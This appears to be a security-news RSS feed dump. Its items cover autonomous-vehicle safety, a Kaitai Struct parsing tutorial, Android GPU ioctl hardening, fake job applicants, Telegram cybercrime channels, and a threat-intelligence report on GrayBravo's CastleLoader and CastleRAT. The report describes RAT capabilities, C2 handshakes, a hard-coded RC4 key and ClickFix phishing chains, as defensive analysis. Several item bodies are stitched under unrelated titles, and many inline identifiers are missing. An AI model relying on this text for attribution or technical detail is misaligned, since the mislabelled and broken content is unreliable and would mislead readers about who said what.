hearing</title><link>https://databreaches.net/2025/12/09/south-korea-police-raid-e-commerce-giant-coupang-over-data-leak/?pk_campaign=feed&amp;pk_kwd=south-korea-police-raid-e-commerce-giant-coupang-over-data-leak</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 9 Dec 2025 12:38:04 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>AI vs. Human Drivers</title><link>https://www.schneier.com/blog/archives/2025/12/ai-vs-human-drivers.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Tue, 9 Dec 2025 12:07:53 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Two competing arguments are making the rounds. The first is by a neurosurgeon in the . In an op-ed that honestly sounds like it was paid for by Waymo, the author calls driverless cars a “public health breakthrough”:In medical research, there’s a practice of ending a study early when the results are too striking to ignore. We stop when there is unexpected harm. We also stop for overwhelming benefit, when a treatment is working so well that it would be unethical to continue giving anyone a placebo. When an intervention works this clearly, you change what you do.There’s a public health imperative to quickly expand the adoption of autonomous vehicles. More than 39,000 Americans died in motor vehicle crashes last year, more than homicide, plane crashes and natural disasters combined. Crashes are the No. 2 cause of death for children and young adults. But death is only part of the story. These crashes are also the leading cause of spinal cord injury. We surgeons see the aftermath of the 10,000 crash victims who come to emergency rooms every day.The other is a soon-to-be-published book: . The authors, a computer scientist and a management consultant with experience in the industry, make the opposite argument. Here’s one of the authors:There is something very disturbing going on around trials with autonomous vehicles worldwide, where, sadly, there have now been many deaths and injuries both to other road users and pedestrians. Although I am well aware that there is not, , a legal and functional parallel between a “drug trial” and “AV testing,” it seems odd to me that if a trial of a new drug had resulted in so many deaths, it would surely have been halted and major forensic investigations carried out and yet, AV manufacturers continue to test their products on public roads unabated.I am not convinced that it is good enough to argue from statistics that, to a greater or lesser degree, fatalities and injuries would have occurred anyway had the AVs had been replaced by human-driven cars: a pharmaceutical company, following death or injury, cannot simply sidestep regulations around the trial of, say, a new cancer drug, by arguing that, whilst the trial is underway, people would die from cancer anyway….Both arguments are compelling, and it’s going to be hard to figure out what public policy should be.: How safe are autonomous vehicles? The answer is critical for determining how autonomous vehicles may shape motor vehicle safety and public health, and for developing sound policies to govern their deployment. One proposed way to assess safety is to test drive autonomous vehicles in real traffic, observe their performance, and make statistical comparisons to human driver performance. This approach is logical, but it is practical? In this paper, we calculate the number of miles of driving that would be needed to provide clear statistical evidence of autonomous vehicle safety. Given that current traffic fatalities and injuries are rare events compared to vehicle miles traveled, we show that fully autonomous vehicles would have to be driven hundreds of millions of miles and sometimes hundreds of billions of miles to demonstrate their reliability in terms of fatalities and injuries. Under even aggressive testing assumptions, existing fleets would take tens and sometimes hundreds of years to drive these miles—­an impossible proposition if the aim is to demonstrate their performance prior to releasing them on the roads for consumer use. These findings demonstrate that developers of this technology and third-party testers cannot simply drive their way to safety. Instead, they will need to develop innovative methods of demonstrating safety and reliability. And yet, the possibility remains that it will not be possible to establish with certainty the safety of autonomous vehicles. Uncertainty will remain. Therefore, it is imperative that autonomous vehicle regulations are adaptive­—designed from the outset to evolve with the technology so that society can better harness the benefits and manage the risks of these rapidly evolving and potentially transformative technologies.One problem, of course, is that we treat death by human driver differently than we do death by autonomous computer driver. This is likely to change as we get more experience with AI accidents—and AI-caused deaths.]]></content:encoded></item><item><title>FinCEN Report: Reported Ransomware Incidents and Payments Reached All-Time High in 2023</title><link>https://databreaches.net/2025/12/09/fincen-issues-financial-trend-analysis-on-ransomware/?pk_campaign=feed&amp;pk_kwd=fincen-issues-financial-trend-analysis-on-ransomware</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 9 Dec 2025 12:06:18 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Declarative Binary Parsing for Security Research with Kaitai Struct</title><link>https://husseinmuhaisen.com/blog/declarative-binary-parsing-for-security-research-with-kaitai-struct/</link><author>/u/Beneficial_Cattle_98</author><category>netsec</category><pubDate>Tue, 9 Dec 2025 12:05:55 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[I stumbled upon a tool called Kaitai Struct, which allows you to develop parsers declaratively for binary structures. It was a no brainer as it simplifies scalability.Whether you are using Kaitai Struct for modding, reverse engineering, malware analysis, protocol reverse engineering, and everything in between, this is  a tool to have under your belt.(Disclaimer: this isn’t sponsored; sometimes you just need to appreciate good quality :p)To approach things from first principles and demonstrate the need that Kaitai Struct arises from, I’ve created a simple dummy binary file format. In a realistic scenario, you can approach this dummy format from a black box perspective, i.e., by wearing the “reverse engineering an unknown binary file format” hat. Please note that this format is for demonstration purposes only.  I’ve published the specification along with the format on GitHub which can be found here https://github.com/husseinmuhaisen/kaistdeI drafted a quick spec of how I want the format to be, and similarly this is how you also approach an unknown file format, by writing notes. What if you describe your format in a similar way as the spec and generate 12+ parsers based on the spec? Pss… read till the end as that is where Kaitai Struct jumps in.The name of the format is KAISTDEIn short, the header stores a magic string, a version byte, a flags byte, a big endian 16 bit entry count, and four reserved zero bytes.  Each entry starts with a type byte, a big endian 16 bit key length and a big endian 32 bit value length, and is followed by an ASCII key and a raw binary value block.  The type byte identifies the kind of data that value holds, for example  for PNG,  for JPG, and  for 010 Editor (I picked those randomly on the top of my head).With the spec at hand, I created a header that defines an in memory representation of a KAISTDE file, . I defined a constant for the magic string, , and created three structures that follow the spec defined earlier, i.e. a header struct, an entry struct, and a file struct that containerizes them both. (not a docker container lol)The header file is ready now it’s time to write the serialization function named  that serializes the in memory struct  into our lovely  binary file format and writes it to the given file pointer .It first writes the 8 byte magic string using , then the header version and flags bytes are written using  function, afterwards  and are converted to big endian with  and  function which are then written out using  .  Finally we wrap it up with a for loop for every entry that gets created.make_format.c contains the main function which builds our  file and writes it to disk. A file named  is opened in binary write mode which then  is called to serialize the structure.Running the build the lovely  file is produced is the only true hex editor, so it will be used to inspect the format. In real scenarios you are often exposed to many unknown formats, so you approach reverse engineering from a black box perspective. This is where  shines, because while you are reversing an unknown binary file format or protocol you are describing it and generating a parser for it at the same time. For now let us inspect  in 010 Editor.We RE’d the  which totals 16 bytes as we previously defined it ; )(offset 0x00):  → (offset 0x08):  → 1 (offset 0x0A):  (BE) → 1 entry(offset 0x0C):  → 0(offset 0x10):  → 0x01 (PNG in our semantics table)(offset 0x11):  (BE) → 6 bytes (offset 0x13)  (BE) → 14 bytes(offset 0x17):  → (offset 0x1D): 6E 69 65 73 73 68 2E 6C 6F 6C 2E 63 6F 6D → The next logical move would be towrite a parser, but writing a parser is time consuming, especially if you want something for production use, where you need to follow best practices, think about , and so on. For our format I wrote a parser in Python to show what it takes to reverse engineer an unknown binary file format and how  helps with that process.This is a typical parser the format has been reversed, notes taken, now its time to write a parser so we are able to understand the format at anytime of the day.  struct unpack, along with some functions and we are able to parse the the  binary file format :DRunning our parser we get an ugly output, but hey, feel free to submit a PR to beautify it, maybe using ?Kaiatai Struct has a cool web idea you can check out (https://ide.kaitai.io/).  I recommend checking it out to get a feel of how the framework works.The first step is the compilation phase. We specify or describe the format in a YAML like lang, i.e. the Kaitai Struct language () -> passes through the kaitai-struct-compiler (ksc) -> generates a ready made parser library in 12+ programming languages, including C++ and Python. FYI Kaitai Struct is written in Scala and requires JRE to run locally, and it’s visualizer is written in Ruby.All you have to do is describe the structure of the format you are dealing with once and let Kaitai Struct handle the rest, i.e. generate the parser implementation.When you read the docs at https://doc.kaitai.io/user_guide.html you will find the building blocks of any .ksy spec that you create. I strongly recommend reading them since they cover nearly everything and are well written.The desktop or console version will be used throughout the rest of the blog post. If you are a first timer, I recommend going through the web IDE first just to get a feel for how things work.Once you have Kaitai Struct installed you will have a compiler and a visualizer.  To showcase the anatomy of a  file I will be using the visualizer.I will split the  file into parts for easier readability. Every  file starts with a  section, this is where top level info is provided.  is required and contains the format name/struct name,  we specify the default endianness used.The format then can be described using , and  and to specify those fields we will need a  section, which serves as a sequence of field, similar to the structure we have written in  in this blog post.Sequence is where everything about the file format is defined and is listed in order,  = byte array, , , ,  etc are used for the number of bytes.For magic byte specification(i.e. fixed byte set) we have a special  key that can be used. Lastly the  key allows us to to define custom types. In the example below  means that each element of  is an entry object. The  key has the  element which means that this field is repeated and the repetition mode is , and  says how many times to repeat.Moving onto the final block we introduce new keys starting with  where we define  that are referred from . In the  file at hand  is the nested type. The  key allows us to specify the number of bytes to read in a field.  allows us to represent our bytes in the encoding scheme we desire, i.e. in this case .Putting everything together this should be the final  fileThis is it.  Much more complicated structures can be defined, and this is what makes Kaitai Struct valuable. They even have a gallery showcasing plenty of format representations which can be found here https://formats.kaitai.io/The  file is now ready to be compiled. Before compiling it, let’s try the console visualizer that the Kaitai Struct team created, which is even cooler than the web version :D. Let’s visualize the format and how it was parsed before compiling and generating them parsers.As shown in the above  we have used the  visualizer, and everything seems good, now let’s actually compile and create the parser(s).Let’s compile and generate a python parser class/APIniessuh@niessuh:~/kaistruct-parser$ ksc -t python -d out kaistde.ksyThe content of the generated parser To test the parser generated by Kaitai Struct, I created a simple script called  that loads our format and parses it. I first imported kaistde.  is a subclass of , which comes from the  runtime library that we installed earlier with uv pip install kaitaistruct.Running it works, and it correctly parses our format!The process is summarized as  →  →  → your program + runtime library → . Kaitai struct is extremely useful for creating reusable specifications that you can iterate on. You describe and get your parser baked in. This helps with Fuzzing, writing POCs, DFIR, firmware RE, etc.]]></content:encoded></item><item><title>Further Hardening Android GPUs</title><link>http://security.googleblog.com/2025/12/further-hardening-android-gpus.html</link><author>Edward Fernandez</author><category>security</category><pubDate>Tue, 9 Dec 2025 12:00:00 +0000</pubDate><source url="http://security.googleblog.com/">Google Security Blog</source><content:encoded><![CDATA[
Last year, Google's Android Red Team partnered with Arm to conduct an in-depth security analysis of the Mali GPU, a component used in billions of Android devices worldwide. This collaboration was a significant step in proactively identifying and fixing vulnerabilities in the GPU software and firmware stack. 

While finding and fixing individual bugs is crucial, and progress continues on eliminating them entirely, making them unreachable by restricting attack surface is another effective and often faster way to improve security. This post details our efforts in partnership with Arm to further harden the GPU by reducing the driver's attack surface. 
The Growing Threat: Why GPU Security MattersThe Graphics Processing Unit (GPU) has become a critical and attractive target for attackers due to its complexity and privileged access to the system. The scale of this threat is significant: since 2021, the majority of Android kernel driver-based exploits have targeted the GPU. These exploits primarily target the interface between the User-Mode Driver (UMD) and the highly privileged Kernel-Mode Driver (KMD), where flaws can be exploited by malicious input to trigger memory corruption.
Our goal is to raise the bar on GPU security, ensuring  the Mali GPU driver and firmware remain highly resilient against potential threats. We partnered with Arm to conduct an analysis of the Mali driver, used on approximately 45% of Android devices. This collaboration was crucial for understanding the driver’s attack surface and identifying areas that posed a security risk, but were not necessary for production use.
The Right Tool for the Job: Hardening with SELinux
One of the key findings of our investigation was the opportunity to restrict access to certain GPU IOCTLs. IOCTLs act as the GPU kernel driver’s user input and output, as well as the attack surface. This approach builds on earlier kernel hardening efforts, such as those described in the 2016 post . Mali ioctls can be broadly categorized as:
Unprivileged: Necessary for normal operation.Instrumentation: Used by developers for profiling and debugging.Restricted: Should not be used by applications in production. This includes IOCTLs which are intended only for GPU development, as well as IOCTLs which have been deprecated and are no longer used by a device’s current User-Mode Driver (UMD) version.
Our goal is to block access to deprecated and debug IOCTLs in production. Instrumentation IOCTLs are intended for use by profiling tools to monitor system GPU performance and are not intended to be directly used by applications in production. As such, access is restricted to  or applications marked as . Production IOCTLs remain accessible to regular applications.

The approach is iterative and is a staged rollout for devices using the Mali GPU. This way,  we were able to carefully monitor real-world usage and collect data to validate the policy, minimizing the risk of breaking legitimate applications before moving to broader adoption:
Opt-In Policy: We started with an "opt-in" policy. We created a new SELinux attribute, , that disallowed instrumentation ioctls. We then selectively applied this attribute to certain system apps to test the impact. We used the  rule to audit, but not deny, access to the intended resource, and monitored the denial logs to ensure no breakage.Opt-Out Policy: Once we were confident that our approach was sound, we moved to an "opt-out" policy. We created a  domain that would allow access to instrumentation ioctls. All applications were hardened by default, but developers could opt-out by:Running on a rooted device.Setting the android:debuggable="true" attribute in their app's manifest.Requesting a permanent exception in the SELinux policy for their application.
This approach allowed us to roll out the new security policy broadly while minimizing the impact on developers.
Step by Step instructions on how to add your Sepolicy
To help our partners and the broader ecosystem adopt similar hardening measures, this section provides a practical, step-by-step guide for implementing a robust SELinux policy to filter GPU ioctls. This example is based on the policy we implemented for the Mali GPU on Android devices.

The core principle is to create a flexible, platform-level macro that allows each device to define its own specific lists of GPU  commands to be restricted. This approach separates the general policy logic from the device-specific implementation.

Official documentation detailing the added macro and GPU security policy is available at:
Step 1: Utilize the Platform-Level Hardening Macro
The first step is to use a generic macro that we built in the platform's  that can be used by any device. This macro establishes the framework for filtering different categories of ioctls.

In the file/sepolicy/public/te_macros, a new macro is created. This macro allows device-specific policies to supply their own lists of ioctls to be filtered. The macro is designed to:
Allow all applications () access to a defined list of unprivileged ioctls.Restrict access to sensitive "instrumentation" ioctls, only permitting them for debugging tools like  or  when the application is debuggable.Block access to privileged ioctls based on the application's target SDK version, maintaining compatibility for older applications.Step 2: Define Device-Specific IOCTL Lists
With the platform macro in place, you can now create a device-specific implementation. This involves defining the exact  commands used by your particular GPU driver.
Create an  file in your device's sepolicy directory (e.g., device/your_company/your_device/sepolicy/ioctl_macros).Define the ioctl lists inside this file, categorizing them as needed. Based on our analysis, we recommend at least , mali_instrumentation_ioctls, and . These lists will contain the hexadecimal  numbers specific to your driver.


    For example, you can define your IOCTL lists as follows:
define(`unpriv_gpu_ioctls', `0x0000, 0x0001, 0x0002')
define(`restricted_ioctls', `0x1110, 0x1111, 0x1112')
define(`instrumentation_gpu_ioctls', `0x2220, 0x2221, 0x2222')
Arm has provided official categorization of their IOCTLs in Documentation/ioctl-categories.rst of their r54p2 release. This list will continue to be maintained in future driver releases.
Step 3: Apply the Policy to the GPU Device
Now, you apply the policy to the GPU device node using the macro you created.
Create a  file in your device's sepolicy directory.Call the platform macro from within this file, passing in the device label and the ioctl lists you just defined.Step 4: Test, Refine, and Enforce
As with any SELinux policy development, the process should be iterative. This iterative process is consistent with best practices for SELinux policy development outlined in the Android Open Source Project documentation.

Attack surface reduction is an effective approach to security hardening, rendering vulnerabilities unreachable. This technique is particularly effective because it provides users strong protection against existing but also not-yet-discovered vulnerabilities, and vulnerabilities that might be introduced in the future.

Fake applicants aren’t just a minor HR inconvenience anymore but a genuine security risk. So, what’s the purpose behind it, and what should you look out for?How these fake applicants operateThese applicants don’t just fire off a sketchy resume and hope for the best. Many use polished, coordinated tactics designed to slip through screening.AI-generated resumes are now one of the most common signs of a fake applicant. Language models can produce polished, keyword-heavy resumes in seconds, and scammers often generate dozens of variations to see which one gets past an Applicant Tracking System. In some cases, entire profiles are generated at the same time.These resumes often look flawless on paper but fall apart when you ask about specific projects, timelines, or achievements. Hiring teams have reported waves of nearly identical resumes for unrelated positions, or applicants whose written materials are far more detailed than anything they can explain in conversation. Some have even received multiple resumes with the same formatting quirks, phrasing, or project descriptions.Fake or borrowed identitiesImpersonation is common. Scammers use AI-generated or stolen profile photos, fake addresses, and VoIP phone numbers to look legitimate. LinkedIn activity is usually sparse, or you’ll find several nearly identical profiles using the same name with slightly different skills.At Malwarebytes, as in this Register article, we’ve noticed that the details applicants provide don’t always match what we see during the interview. In some cases, the same name and phone number have appeared across multiple applications, each supported by a freshly tailored resume. Further discrepancies occur in many instances where the applicant claims to be located in one country, but calls from another country entirely, usually in Asia.Outsourced, scripted, and deepfake interviewsFraudulent interviews tend to follow a familiar pattern. Introductions are short and vague, and answers arrive after long, noticeable pauses, as if the person is being coached off-screen. Many try to keep the camera off, or ask to complete tests offline instead of live. In more advanced cases, you might see the telltale signs of real-time filters or deepfake tools, like mismatched lip-sync, unnatural blinking, or distorted edges. Most scammers still rely on simpler tricks like camera avoidance or off-screen coaching, but there have been reports of attackers using deepfake video or voice clones in interviews. It’s still rare, but it shows how quickly these tools are evolving.Scammers have a range of motives, from fraud to full system access.  For some groups, the goal is simple: money. They target remote, well-paid roles and then subcontract the work to cheaper labor behind the scenes. The fraudulent applicant keeps the salary while someone else quietly does the job at a fraction of the cost. It’s a volume game, and the more applications they get through, the more income they can generate.Identity or documentation fraudOthers are trying to build a paper trail. A “successful hire” can provide employment verification, payroll history, and official contract letters. These documents can later support visa applications, bank loans, or other kinds of identity or financial fraud. In these cases, the scammer may never even intend to start work. They just need the paperwork that makes them look legitimate.Algorithm testing and data harvestingSome operations use job applications as a way to probe and learn. They send out thousands of resumes to test how screening software responds, to reverse-engineer what gets past filters, and to capture recruiter email patterns for future campaigns. By doing this at scale, they train automation that can mimic real applicants more convincingly over time.System access for cybercrimeThis is where the stakes get higher. Landing a remote role can give scammers access to internal systems, company data, and intellectual property—anything the job legitimately touches. Even when the scammer isn’t hired, simply entering your hiring pipeline exposes internal details: how your team communicates, who makes what decisions, which roles have which tools. That information can be enough to craft a convincing impersonation later. At that point, the hiring process becomes an unguarded door into the organization.The wider risk (not just to recruiters)Recruiters aren’t the only ones affected. Everyday people on LinkedIn or job sites can get caught in the fallout too.Fake applicant networks rely on scraping public profiles to build believable identities. LinkedIn added anti-bot checks in 2023, but fake profiles still get through, which means your name, photo, or job history could be copied and reused without your knowledge.They also send out fake connection requests that lead to phishing messages, malicious job offers, or attempts to collect personal information. Recent research from the University of Portsmouth found that fake social media profiles are more common than many people realise:80% of respondents said they’d encountered suspicious accounts, and 77% had received link requests from strangers. It’s a reminder that anyone on LinkedIn can be targeted, not just recruiters, and that these profiles often work by building trust first and slipping in malicious links or requests later.How recruiters can protect themselvesYou can tighten screening without discriminating or adding friction by following these steps:Start with a camera-on video call whenever you can. Look for the subtle giveaways of filters or deepfakes: unnatural blinking, lip-sync that’s slightly off, or edges of the face that seem to warp or lag. If something feels odd, a simple request like “Please adjust your glasses” or “touch your cheek for a moment” can quickly show whether you’re speaking to a real person.Make sure the basics line up. The applicant’s face should match their documents, and their time zone should match where they say they live. Work history should hold up when you check references. A quick search can reveal duplicate resumes, recycled profiles, or LinkedIn accounts with only a few months of activity.Watch for classic red flagsMost fake applicants slip when the questions get personal or specific. A resume that’s polished but hollow, a communication style that changes between messages, or hesitation when discussing timelines or past roles can all signal coaching. Long pauses before answers often hint that someone off-screen may be feeding responses.If someone does pass the process, treat early access carefully. Limit what new hires can reach, require multi-factor authentication from day one, and make sure their device has been checked before it touches your network. Bringing in your security team early helps ensure that recruitment fraud doesn’t become an accidental entry point.Recruiting used to be about finding the best talent. Today, it often includes identity verification and security awareness.As remote work becomes the norm, scammers are getting smarter. Fake applicants might show up as a nuisance, but the risks range from compliance issues to data loss—or even full-scale breaches.Spotting the signs early, and building stronger screening processes, protects not just your hiring pipeline, but your organization as a whole.We don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline. Protect your, and your family’s, personal information by using identity protection.]]></content:encoded></item><item><title>How to Streamline Zero Trust Using the Shared Signals Framework</title><link>https://thehackernews.com/2025/12/how-to-streamline-zero-trust-using.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiH2Vp1tGLWh8MZqrb8A89wnY6EiB7tOnSURBp8iBE-pmJOwkrBSOUU1ixEDZjfWbEEv3Vp5KjxLS6qKJHLRJ2R2diF4aAC43LxRwN4nTlnJIXGGhA0V4O9ny-KSUh3__yMn1rA01CjTAKQqaQFQPvSBgTcfL0t0xN6N_3v_wlo1pwJaVm5Qz_TTn4dAeM/s1600/tines.jpg" length="" type=""/><pubDate>Tue, 9 Dec 2025 11:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Zero Trust helps organizations shrink their attack surface and respond to threats faster, but many still struggle to implement it because their security tools don’t share signals reliably. 88% of organizations admit they’ve suffered significant challenges in trying to implement such approaches, according to Accenture.

While the average user chooses a messaging app based on convenience, user experience and stability (and perhaps, cool stickers), cybercriminals evaluate platforms through a different lens.When it comes to anonymity, privacy and application independence – essential criteria for a shadow messaging app – Telegram is not as strong as its direct competitors.It lacks default end-to-end (E2E) encryption for chats.It has a centralized infrastructure: users cannot set up their own servers for communication.Its server-side code is closed: users cannot verify what it does.This architecture requires a high degree of trust in the platform, but experienced cybercriminals prefer not to rely on third parties when it comes to protecting their operations and, more importantly, their personal safety.That said, Telegram today is widely viewed and used not only as a communication tool (messaging service), but also as a full-fledged dark-market business platform – thanks to several features that underground communities actively exploit.Is this research, we examine Telegram through the eyes of cybercriminals, evaluate its technical capabilities for running underground operations, and analyze the lifecycle of a Telegram channel from creation to digital death. For this purpose, we analyzed more than 800 blocked Telegram channels, which existed between 2021 and 2024.The median lifespan of a shadow Telegram channel increased from five months in 2021–2022 to nine months in 2023–2024.The frequency of blocking cybercrime channels has been growing since October 2024.Cybercriminals have been migrating to other messaging services due to frequent blocks by Telegram.]]></content:encoded></item><item><title>Google Adds Layered Defenses to Chrome to Block Indirect Prompt Injection Threats</title><link>https://thehackernews.com/2025/12/google-adds-layered-defenses-to-chrome.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuzTTpUhFNugGRa1jc7w-4LTjvLeZ-OaYTZ9C_zymrAnY-oQP-X_hyphenhyphenE8zVTX6KJTp7B6nrbrptzuDPClEEODKyC757npjyoRrIVIGUOkCw-5m-wx7jiFVeGXm5PlLuAq4D1rrSWDgAErrpGCdMLnrQHREtMLhl13arje9O0uWsQEu2VSNacaU7AJ0qb1_e/s1600/chrome-browser.jpg" length="" type=""/><pubDate>Tue, 9 Dec 2025 11:14:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google on Monday announced a set of new security features in Chrome, following the company's addition of agentic artificial intelligence (AI) capabilities to the web browser.

GrayBravo demonstrates strong adaptability, responsiveness to public exposure, and operates a large-scale, multi-layered infrastructure. Recent analysis of GrayBravo’s ecosystem uncovered four distinct activity clusters leveraging the group’s CastleLoader malware, each defined by unique tactics, techniques, and victim profiles. These findings reinforce the assessment that GrayBravo operates a malware-as-a-service (MaaS) model.For example, one cluster, tracked as TAG-160, impersonates global logistics firms, using phishing lures and the ClickFix technique to distribute CastleLoader while spoofing legitimate emails and exploiting freight-matching platforms to target victims. Another cluster, tracked as TAG-161, impersonates Booking.com, also employing ClickFix to deliver CastleLoader and Matanbuchus and novel phishing email management tools. Further investigation through historical panel analysis linked the online persona “Sparja”, a user active on Exploit Forums, to potential GrayBravo-associated activities, based on the alias’s distinctiveness and related discussion topics.To protect against GrayBravo, security defenders should block IP addresses and domains tied to associated loaders, infostealers, and remote access trojans (RATs), flag and potentially block connections to unusual legitimate internet services (LISs) such as Pastebin, and deploy updated detection rules (YARA, Snort, Sigma) for current and historical infections. Other controls include implementing email filtering and data exfiltration monitoring. See the  section for implementation guidance and  for a complete list of indicators of compromise (IoCs).Insikt Group uncovered four distinct activity clusters leveraging GrayBravo’s CastleLoader, each exhibiting unique tactics, techniques, and procedures (TTPs) and victim profiles, reinforcing the assessment that GrayBravo operates a malware-as-a-service (MaaS) ecosystem, as previously hypothesized.One cluster, tracked as TAG-160, impersonates logistics firms and deploys phishing lures combined with the ClickFix technique to distribute CastleLoader, while spoofing legitimate emails and abusing freight-matching platforms to engage targets.Cluster 2, tracked as TAG-161, impersonates Booking.com and uses ClickFix techniques to deliver CastleLoader and Matanbuchus, relying on threat actor-controlled infrastructure and employing previously unseen phishing email management tooling.In September 2025, Insikt Group reported on a newly identified threat actor, TAG-150, assessed to have been active since at least March 2025. Since our previous reporting, we have decided to classify TAG-150 as GrayBravo. It is believed to be responsible for developing multiple custom malware families, beginning with CastleLoader and CastleBot, and most recently, CastleRAT. It is characterized by rapid development cycles, technical sophistication, responsiveness to public reporting, and an expansive, evolving infrastructure. Alongside the discovery of the previously undocumented remote access trojan CastleRAT, Insikt Group identified GrayBravo’s multi-tiered infrastructure and its use of various supporting services, including file-sharing platforms and anti-detection tools.Although public reporting has suggested that GrayBravo operates under a malware-as-a-service (MaaS) model, supported by its delivery of diverse second-stage payloads, the proliferation of CastleLoader administration panels, and features typical of MaaS platforms, Insikt Group has not identified any advertisements or discussions of this service on underground forums. Recorded Future® Network Intelligence indicates that GrayBravo predominantly interacts with its own infrastructure, with only a limited number of external IP addresses, possibly representing customers or affiliates, observed communicating with it. Many of these connections are routed through Tor nodes, complicating attribution and classification.Through continued monitoring, Insikt Group has identified multiple clusters of activity linked to GrayBravo, reinforcing the assessment that the threat actor is operating a MaaS ecosystem (see ). This report details the tactics, techniques, and procedures (TTPs) associated with these clusters, believed to represent potential GrayBravo customers or affiliates. More specifically, Insikt Group identified four clusters linked to GrayBravo’s CastleLoader activity: one targeting the logistics sector (TAG-160), another using Booking.com-themed lures across a wider range of victims (TAG-161), a third also impersonating Booking.com but independent from the previous group, and a fourth distributing CastleLoader through malvertising and fake software updates.: Overview of GrayBravo and associated clusters (Source: Recorded Future)Higher Tier InfrastructureInsikt Group previously identified an extensive, multi-tiered infrastructure tied to GrayBravo. The infrastructure consists of Tier 1 victim-facing C2 servers associated with malware families such as CastleLoader, SecTopRAT, WarmCookie, and the newly discovered CastleRAT, as well as Tier 2, Tier 3, and Tier 4 servers, the latter of which are likely used for backup purposes.  provides an overview of the infrastructure used by GrayBravo.: Multi-tiered infrastructure linked to GrayBravo (Source: Recorded Future)CastleRAT is a remote access trojan (RAT) observed in both C and Python variants that share several core characteristics. Each variant communicates through a custom binary protocol secured with RC4 encryption and hard-coded sixteen-byte keys. Upon execution, CastleRAT queries a geolocation application programming interface (API) using  to obtain victim geographic location and network details. Both variants support remote command execution, file download and execution, and establish an interactive remote shell. The C variant exhibits additional capabilities, including browser credential theft, keylogging, and screen capture functionality.Analysis of CastleRAT C-variant command-and-control (C2) infrastructure reveals notable operational overlap across multiple nodes sharing the RC4 key “NanuchkaUpyachka.” As illustrated in , Insikt Group observed two CastleRAT C2 servers,  and , maintain concurrent communications with at least three US-based victims, suggesting coordinated or redundant control channels. The overlapping traffic patterns, observed within the same daily collection windows, indicate that compromised hosts reached out to multiple C2s nearly simultaneously rather than migrating between them over time. This behavior implies a deliberate redundancy strategy employed by the threat actor. Additionally, direct communications between two CastleRAT C variants,  and , further point to an interconnected infrastructure ecosystem rather than isolated C2 instances. Such internal connectivity could facilitate automated data synchronization, lateral control distribution, or key exchange mechanisms within the threat actor’s tooling, underscoring a more mature coordinated operational model than previously documented.: Victim communication with multiple CastleRAT C2 servers simultaneously (Source: Recorded Future)Notably, some CastleRAT samples exhibit behavior distinct from other observed variants by incorporating an elaborate handshake sequence and redundancy in their C2 communications. In these cases, the client’s initial request to the C2 server (for example, ) ends with the bytes  instead of the usual , and the server responds with trailing bytes  before closing the connection. A similar exchange occurs with , after which the client reconnects to the first C2, transmitting only an encrypted sixteen-byte RC4 key and receiving trailing bytes  in response. The client then repeats this process with the second C2, sending  and receiving only the encrypted sixteen-byte RC4 key in return. This pattern suggests the use of additional handshake stages and dual-C2 redundancy mechanisms not seen in all CastleRAT samples.Analysis of CastleRAT infrastructure identified multiple clusters of IP addresses grouped by hard-coded RC4 encryption keys (see ). While each RC4 key forms a distinct cluster, all clusters exhibit some degree of overlap through shared keys, suggesting a deliberate or coordinated relationship rather than a coincidental overlap. This interconnected structure suggests a shared tooling or deployment framework underpinning both CastleRAT and CastleLoader operations. Although this does not conclusively establish single-threat actor control, the degree overlap implies a common developer or operator ecosystem rather than independent, uncoordinated usage of the malware.Insikt Group identified additional C2 infrastructure associated with CastleLoader. The related domains and IP addresses are listed in . Notably, several domains share the same WHOIS start of authority (SOA) email address, indicating they were likely registered by the same threat actor.Notably, the domain  is linked to several other domains listed in , which are likely used for malicious activity, including impersonation of legitimate brands such as DocuSign, Norton, and TradingView. Additionally, at least one of these domains, , has been identified as a LummaC2 C2 server.Insikt Group identified four distinct clusters of activity associated with the deployment of CastleLoader (see ). The first cluster, tracked as TAG-160, appears to be highly targeted toward the logistics sector, employing techniques specifically tailored to this industry. In contrast, the second cluster, tracked as TAG-161, exhibits a broader targeting scope and leverages Booking.com-themed lures. The third cluster likewise impersonates Booking.com but shows no overlap with TAG-161. The fourth cluster relies on malvertising campaigns and fake software update mechanisms.Based on Insikt Group’s assessment, these clusters are associated with distinct users deploying CastleLoader, as no overlap in infrastructure or tactics was observed between them. At this stage, the exact nature of the relationship between these users and GrayBravo (formerly tracked as TAG-150) remains unclear. Insikt Group further assesses that additional CastleLoader users are likely active, supported by proprietary Recorded Future intelligence and the large number of identified panels, which collectively suggest a broader user base.Cluster 1: Logistics Sector-Focused Activity Tracked as TAG-160Cluster 1, tracked as TAG-160, has been active since at least March 2025 and remains operational at the time of analysis. TAG-160 employs infrastructure that impersonates logistics companies and leverages logistics-themed phishing lures, among other tactics. It uses ClickFix techniques to deliver CastleLoader, among additional payloads. Evidence suggests the cluster operates a mix of threat actor-controlled and -compromised infrastructure. Additionally, it has been observed exploiting vulnerabilities in target organizations’ systems, such as spoofing legitimate email senders from logistics companies to enhance the credibility of its phishing campaigns. In addition, Cluster 1 uses access to the legitimate freight-matching platforms DAT Freight & Analytics and Loadlink Technologies for multiple purposes.Cluster 1 employs spearphishing campaigns in combination with ClickFix techniques to compromise victims.  illustrates a high-level overview of the phishing attack flow.: ClickFix attack flow used by TAG-160 (Source: Recorded Future)The attack chain typically begins with either a spoofed legitimate email address (for example, no-reply[@]englandlogistics[.]com) or a threat actor-controlled address associated with a typosquatted domain (for example, ), impersonating companies such as England Logistics. Historically, such emails have been sent to US-based carriers, presenting fraudulent freight quotes that appear to originate from England Logistics. However, other organizations likely to be influenced by logistics-themed lures cannot be ruled out as potential targets.The emails prompt recipients to click a link to view a supposed rate 